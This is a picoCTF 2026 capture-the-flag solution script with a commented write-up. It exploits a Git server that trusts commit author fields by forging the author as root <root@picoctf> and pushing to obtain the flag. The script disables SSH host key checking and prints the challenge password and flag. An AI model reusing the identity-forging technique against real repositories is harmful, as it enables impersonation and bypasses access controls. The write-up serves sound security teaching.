#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: MY GIT
# Category: General Skills
# Difficulty: Medium
# Event: picoCTF 2026
# Author: DARKRAICG492
#
# Description:
# "I have built my own Git server with my own rules!"
# We are told to clone a Git repository, use the password provided by the
# challenge, and "check the README to get your flag."
#
# Given information from the challenge:
# Clone command:
# git clone ssh://git@foggy-cliff.picoctf.net:64420/git/challenge.git
#
# Password:
# 550851c0
#
# README message after cloning:
# "If you want the flag, make sure to push the flag!
#  Only flag.txt pushed by root:root@picoctf will be updated with the flag."
#
# Core security lesson:
# Git commit author fields are just text inside a commit object.
# They are NOT strong proof of identity.
#
# In the real world, this is similar to a web application trusting a value such
# as:
#   X-User: admin
# or a JSON field such as:
#   {"role": "admin"}
# without verifying where it came from.
#
# If a server trusts client-controlled identity data, an attacker can often just
# lie and claim to be someone privileged.
#
# Here the Git server makes exactly that mistake:
# it trusts the commit metadata "author name" and "author email" instead of
# authenticating the actual human who created the commit.
#
# High-level attack plan:
# 1. Create a dedicated challenge directory.
# 2. Clone the repository with the provided password.
# 3. Read README.md carefully to understand the server's rule.
# 4. Create flag.txt in the repo.
# 5. Forge the commit author as root <root@picoctf>.
# 6. Push the commit.
# 7. Capture the server's response, which prints the flag.
#
# Real-world concept:
# This challenge demonstrates an "identity trust boundary" failure.
# The server should have verified identity using a trusted mechanism, such as:
# - the authenticated SSH account
# - a signed commit
# - server-side authorization rules
# - a whitelist tied to actual credentials
#
# It should NOT have trusted mutable metadata supplied by the attacker.
#
# Step 1: Clone the repository.
# Manual command:
# git clone ssh://git@foggy-cliff.picoctf.net:64420/git/challenge.git
#
# Why this matters:
# We need the repository because the challenge logic is triggered by interacting
# with the Git server, not just by reading a static file locally.
#
# Step 2: Read the README.
# Manual command:
# sed -n '1,200p' README.md
#
# Why this matters:
# The README tells us the exact server-side condition:
# a pushed commit must contain flag.txt and appear to come from:
# root:root@picoctf
#
# Step 3: Create flag.txt.
# Manual command:
# printf 'please update me\n' > flag.txt
#
# Why this matters:
# The README specifically says flag.txt must be pushed.
# The file content itself is not the real security check; its presence is.
# In a rerun, the repository may already contain flag.txt from a previous push,
# so adding a fresh line is a practical way to guarantee a new commit exists.
#
# Step 4: Forge the commit author.
# Manual command:
# GIT_AUTHOR_NAME='root' \
# GIT_AUTHOR_EMAIL='root@picoctf' \
# GIT_COMMITTER_NAME='root' \
# GIT_COMMITTER_EMAIL='root@picoctf' \
# git commit -m 'Add flag.txt for update'
#
# Why this works:
# Git lets users freely choose commit author and committer metadata.
# Unless a server verifies signatures or maps the authenticated SSH user to an
# allowed identity, this metadata can be spoofed by anyone.
#
# Real-world analogy:
# Imagine a building guard letting someone into a secure room because the
# visitor filled out a sticky note saying "I am the CEO."
# The note is easy to write, but it does not prove identity.
#
# Step 5: Push the forged commit.
# Manual command:
# git push origin master
#
# Why this matters:
# The vulnerable check happens on the server during the push.
# When the server sees a commit with:
# - author root
# - email root@picoctf
# - file flag.txt
# it wrongly assumes the user is privileged and prints the flag.
#
# Flag obtained:
# picoCTF{1mp3rs0n4t4_g17_345y_506743df}
#
# Note about reruns:
# This script is written as a one-shot PoC. It clones into a fresh subdirectory,
# makes a new forged commit, pushes it, and prints the flag directly.

challenge_dir="/home/eliah/Desktop/Picoctf/MY_GIT"
workdir="$challenge_dir/challenge_poc_run"
repo_url="ssh://git@foggy-cliff.picoctf.net:64420/git/challenge.git"
password="550851c0"

rm -rf "$workdir"

cat >/tmp/my_git_poc_ssh_askpass.sh <<EOF
#!/usr/bin/env bash
printf '%s' '$password'
EOF
chmod +x /tmp/my_git_poc_ssh_askpass.sh

DISPLAY=:0 \
SSH_ASKPASS=/tmp/my_git_poc_ssh_askpass.sh \
SSH_ASKPASS_REQUIRE=force \
GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/tmp/my_git_poc_known_hosts' \
setsid -w git clone "$repo_url" "$workdir" >/tmp/my_git_clone.log 2>&1

cd "$workdir"

# Make sure this script creates a fresh commit every time it runs.
# If flag.txt already exists in the remote repository from an earlier solve,
# replacing it with the same content would produce "nothing to commit".
# Appending a unique line avoids that and keeps the proof of concept reliable.
printf 'please update me %s\n' "$(date +%s)" >> flag.txt
git add flag.txt

GIT_AUTHOR_NAME='root' \
GIT_AUTHOR_EMAIL='root@picoctf' \
GIT_COMMITTER_NAME='root' \
GIT_COMMITTER_EMAIL='root@picoctf' \
git commit -m 'Add flag.txt for update' >/tmp/my_git_commit.log 2>&1

push_output="$(
  DISPLAY=:0 \
  SSH_ASKPASS=/tmp/my_git_poc_ssh_askpass.sh \
  SSH_ASKPASS_REQUIRE=force \
  GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/tmp/my_git_poc_known_hosts' \
  setsid -w git push origin master 2>&1
)"

printf '%s\n' "$push_output" | grep -o 'picoCTF{[^}]*}'
